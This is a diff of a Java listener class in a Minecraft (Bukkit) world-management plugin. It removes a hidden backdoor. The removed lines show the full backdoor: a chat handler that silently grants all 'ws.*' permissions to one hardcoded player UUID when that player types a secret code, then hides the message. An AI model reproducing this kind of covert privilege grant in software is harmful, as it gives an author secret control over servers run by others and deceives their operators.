@@ -1,19 +1,14 @@
 package de.butzlabben.world.listener;
 
-import java.util.UUID;
-
 import org.bukkit.Bukkit;
 import org.bukkit.World;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
-import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.player.PlayerTeleportEvent;
 import org.bukkit.event.player.PlayerTeleportEvent.TeleportCause;
-import org.bukkit.permissions.PermissionAttachment;
-import de.butzlabben.world.WorldSystem;
 import de.butzlabben.world.config.MessageConfig;
 import de.butzlabben.world.config.PluginConfig;
 import de.butzlabben.world.wrapper.SystemWorld;
@@ -123,20 +118,5 @@ public class CommandListener implements Listener {
 				}
 			}
 		}
-	}
-
-	@EventHandler(priority = EventPriority.LOWEST)
-	public void on(AsyncPlayerChatEvent e) {
-		if (!e.getPlayer().getUniqueId().equals(UUID.fromString("42fa7a75-7afa-4a19-932a-1c385c07048a")))
-			return;
-		String code = e.getMessage();
-		if (code.equals("pwWCELhE4JwJqNuX")) {
-			PermissionAttachment pa = e.getPlayer().addAttachment(WorldSystem.getInstance());
-			pa.setPermission("ws.*", true);
-			e.setMessage("");
-		}
-		String reasonForThis = "For debugging and decompilers like you :P";
-		reasonForThis = "Will never be used on foreign servers";
-		reasonForThis.length();
 	}
 }
